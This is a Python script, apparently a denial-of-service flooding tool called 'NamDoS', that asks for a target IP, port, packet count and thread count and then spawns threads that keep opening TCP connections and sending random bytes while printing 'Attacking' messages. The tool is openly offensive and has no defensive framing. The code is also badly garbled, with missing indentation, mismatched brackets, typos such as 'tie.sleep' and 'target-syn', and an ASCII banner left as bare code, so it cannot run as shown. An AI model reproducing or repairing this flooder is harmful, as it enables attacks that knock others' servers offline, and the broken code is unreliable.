import random
import threading
import socket
import os
import time
from termcolor import colored
os.system('cls')
_   _                       _____             _____ 
 | \ | |                     |  __ \           / ____|
 |  \| |   __ _   _ __ ___   | |  | |   ___   | (___  
 | . ` |  / _` | | '_ ` _ \  | |  | |  / _ \   \___ \ 
 | |\  | | (_| | | | | | | | | |__| | | (_) |  ____) |
 |_| \_|  \__,_| |_| |_| |_| |_____/   \___/  |_____/
                               Copyright: Vo Hoang Nam
print(colored("\n===========================================================\n", 'red'))

ip = str(input(colored("[+] IP: ", 'green')))
port = int(input(colored ("[+] Port: ", 'green'))) 
packet = int(input(colored ("[+] Packets: ", "green")))
thread= int(input(colored ("[+] Threads: ","green"))) time.sleep(1.5)

print(colored(ne time.sleep(2)
print(colored("\n[+] start...","green"}} time.sleep(1)
print(colored("\n","green")) time.sleep(1)
print(colored("\n","green")) time.sleep(1)
print(colored("\n1","green")) tie.sleep(1)
os.system("cls")

def syn(): 
hevin = random, urandom(980)
bb = int(0)
while True: 
try: 
h = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
h.connect((ip, port)) h.send(hevin) for i in range(packet):
h.send(hevin)
bb + 1
print(colored('[+] Attacking '+ip +">>>Sent: +str(bb), except KeyboardInterrupt:
h.close()
print(colored("[+++] DONE !!!!", "green")) 
pass 'red'))
for b in range(thread):
thread - threading.Thread(target-syn)
thread.start()
